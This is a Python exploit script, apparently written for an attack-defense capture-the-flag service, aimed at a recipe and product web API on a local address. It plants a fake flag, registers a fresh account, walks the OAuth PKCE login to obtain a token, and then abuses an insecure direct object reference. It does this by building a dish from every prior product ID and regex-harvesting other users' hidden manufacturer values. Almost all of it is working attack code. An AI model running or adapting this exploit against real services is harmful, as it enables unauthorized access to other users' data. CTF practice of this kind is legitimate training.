#!/usr/bin/env python3.8
from requests import Session
from string import ascii_lowercase
from random import choices, randint
from urllib.parse import urlparse, parse_qs
from base64 import urlsafe_b64encode
from hashlib import sha256
from re import match, compile


def gen_r_string(k=10):
    return ''.join(choices(ascii_lowercase, k=k))


def get_creds():
    return f'{gen_r_string()}@{gen_r_string(5)}.{gen_r_string(2)}', gen_r_string()


def generate_PKCE_codes():
    code_verifier = ''.join(choices(ascii_lowercase, k=100))
    return code_verifier, urlsafe_b64encode(sha256(code_verifier.encode()).digest()).decode().replace('=', '')


IP = '192.168.0.101'
PORT = 5000
URL = f'http://{IP}:{PORT}'


def get_header_with_token():
    s = Session()

    email, password = get_creds()

    res = s.post(f'{URL}/Identity/Account/Register',
                 headers={'Content-Type': 'application/x-www-form-urlencoded'},
                 data=f'Input.Email={email}&Input.Password={password}&Input.Role=Cook',
                 allow_redirects=False)

    if res.status_code != 302:
        print('[-] Registraion fail')
        exit()
    print('[+] Registration compile')

    res = s.post(f'{URL}/Identity/Account/Login',
                 data=f'Input.Email={email}&Input.Password={password}',
                 headers={'Content-Type': 'application/x-www-form-urlencoded'},
                 allow_redirects=False)

    if res.status_code != 302:
        print('[-] Can not log in')
        exit()
    print('[+] Log in successfull')

    code_verifier, code_challenge = generate_PKCE_codes()
    res = s.get(f"{URL}/connect/authorize?client_id=Household&response_type=code&" +
                f"scope=HouseholdAPI%20openid%20profile&state={gen_r_string(32)}&" +
                "response_mode=query&prompt=none&" +
                f"redirect_uri={URL}/authentication/login-callback&" +
                "code_challenge_method=S256&" +
                f"code_challenge={code_challenge}", allow_redirects=False)

    if res.status_code != 302:
        print('[-] Authorization troubles')
        exit()
    callback_query = parse_qs(urlparse(res.headers['Location']).query)

    res = s.post(f"{URL}/connect/token",
                 data=f"client_id=Household&code={callback_query['code'][0]}&redirect_uri={URL}/authentication/login-callback&code_verifier={code_verifier}&grant_type=authorization_code",
                 headers={'Content-Type': 'application/x-www-form-urlencoded'}, allow_redirects=False)

    if res.status_code != 200:
        print('[-] Can not get token')
        exit()
    print('[+] Got token')
    json_res = res.json()
    s.close()
    token = f'{json_res["token_type"]} {json_res["access_token"]}'

    return {'Authorization': token}


def add_product(token_header, manufacturer):
    product = {
        "name": gen_r_string(),
        "protein": randint(1, 10),
        "fat": randint(1, 10),
        "carbohydrate": randint(1, 10),
        "calories": randint(1, 10),
        "manufacturer": manufacturer
    }
    res = Session().post(f"{URL}/api/Products", json=product, headers=token_header, allow_redirects=False)
    if res.status_code != 201:
        print('[-] Can not add product')
        exit()
    print('[+] Product added')
    return res.json()


def create_dish(token_header, ingredients):
    payload = {
        "recipe": gen_r_string(),
        "ingredients": ingredients,
        "name": gen_r_string(),
        "description": gen_r_string(),
        "portionWeight": randint(100, 200)
    }
    res = Session().post(f"{URL}/api/Dishes", json=payload, headers=token_header, allow_redirects=False)
    if res.status_code != 201:
        print('[-] Can\'t create dish')
        exit()
    print('[+] Dish created')
    return res.json()


# Put flag imitation as valid user
FLAG = gen_r_string(k=31).upper() + '='
print('---===CHECKSYSTEM PUT FLAG===---')
print(add_product(get_header_with_token(), FLAG))
print('================================')

# Create hacker account
regexp = compile(r'^[A-Z0-9]{31}=$')
token_header = get_header_with_token()
prod_id = add_product(token_header, gen_r_string())['id']

ingredients = [{"productId": prev_prod_id, "weight": 1} for prev_prod_id in range(prod_id, 0, -1)]
res = create_dish(token_header, ingredients)
flags = [ingr['product']['manufacturer'] for ingr in res['ingredients']
         if ingr['product']['manufacturer'] is not None and match(regexp, ingr['product']['manufacturer'])]

if FLAG in flags:
    print(f'[+] Hack is successfull. {FLAG} found in {flags}')
